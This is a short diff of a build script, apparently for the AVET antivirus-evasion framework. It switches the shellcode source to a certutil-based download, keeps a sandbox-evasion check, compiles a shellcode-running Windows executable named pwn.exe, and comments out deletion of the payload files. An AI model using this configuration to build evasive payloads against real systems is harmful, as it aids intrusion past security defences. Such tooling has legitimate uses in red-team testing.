@@ -31,7 +31,7 @@ add_feature gethostbyname_sandbox_evasion
 #add_feature hide_console
 
 # set shellcode source
-shellcode_source downloadsc
+shellcode_source download_certutil
 
 # set shellcode binding technique
 shellcode_binding exec_shellcode
@@ -43,6 +43,6 @@ append_value PRINT_DEBUG "" source/shellcode_binding.h
 $win32_compiler -o output/pwn.exe source/avet.c -lws2_32
 
 # cleanup
-rm output/thepayload.bin
-rm output/pwn.exe
+#rm output/thepayload.bin
+#rm output/pwn.exe
 cleanup_techniques
